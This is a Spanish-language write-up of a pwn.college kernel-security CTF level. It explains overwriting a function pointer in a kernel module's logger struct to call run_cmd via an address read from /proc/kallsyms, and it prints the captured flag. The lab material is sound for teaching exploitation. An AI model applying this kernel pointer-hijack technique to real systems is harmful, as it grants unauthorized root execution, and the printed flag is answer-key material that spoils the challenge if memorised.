# level 9.0

El módulo nos permite escribir a una entrada proc:
```C

/* WARNING: Function: __x86_indirect_thunk_rax repla ced with injection: x86_indirect_thunk_rax */
/* WARNING: Unknown calling convention */

ssize_t device_write(file *file,char *buffer,size_t lengt h,loff_t *offset)

{
  long it;
  anon_struct_264_2_026bd473 *uint_arr;
  long in_GS_OFFSET;
  anon_struct_264_2_026bd473 logger;
  long canary;
  code *exception;
  
  canary = *(long *)(in_GS_OFFSET + 0x28);
  uint_arr = &logger;
  for (it = 0x42; it != 0; it = it + -1) {
    *(undefined4 *)uint_arr = 0;
    uint_arr = (anon_struct_264_2_026bd473 *)((long)ui nt_arr + 4);
  }
  printk(&DAT_00100b70,file,buffer,length,offset);
  logger.log_function = printk;
  if (0x108 < length) {
    __warn_printk("Buffer overflow detected (%d < %lu)! \n",0x108);
                    /* WARNING: Does not return */
    exception = (code *)invalidInstructionException();
    (*exception)();
  }
  it = _copy_from_user(&logger,buffer,length);
  (*logger.log_function)(logger.buffer);
  if (canary != *(long *)(in_GS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return * /
    __stack_chk_fail();
  }
  return length - it;
}
```

Nuestra entrada se almacena en la estructura `logger`, que luce así:
```
struct logger {
 char buffer[256];
 _func_int_char_ptr_varargs *log_function;	
}
```

Los bytes 0x101-0x108 almacenan la dirección de la función de registro (en este caso apunta a `printk`). Si sobreescribimos esto con una dirección maliciosa podemos invocar dicha función con los primeros 0x100 bytes como argumento.

El kernel cuenta con la función [`run_cmd`](https://elixir.bootlin.com/linux/v5.4/source/kernel/reboot.c#L422) para ejecutar programas en el espacio de usuario de ser necesario:
```C
static int run_cmd(const char *cmd)
{
	char **argv;
	static char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	int ret;
	argv = argv_split(GFP_KERNEL, cmd, NULL);
	if (argv) {
		ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
		argv_free(argv);
	} else {
		ret = -ENOMEM;
	}

	return ret;
}
```

Nuevamente en este reto no hay KASLR, podemos obtener la dirección de `run_cmd` por medio de */proc/kallsyms*:
```
root@vm_practice~kernel-security~level9-0:/home/hacker# grep "run_cmd" /proc/kallsyms
ffffffff81089b30 t run_cmd
```

Finalmente creamos un exploit para sobreescribir el puntero a `printk` con la dirección de `run_cmd` para hacer la flag legible para nuestro usuario:
```
hacker@vm_kernel-security~level9-0:/tmp$ nvim a.c
hacker@vm_kernel-security~level9-0:/tmp$ gcc a.c
.hacker@vm_kernel-security~level9-0:/tmp$ ./a.out ; cat /flag
pwn.college{YVs8aN4YMBCMfJYOGRzFuKGNh0n.dlzM0wCNwYzM5EzW}
```

`pwn.college{YVs8aN4YMBCMfJYOGRzFuKGNh0n.dlzM0wCNwYzM5EzW}`
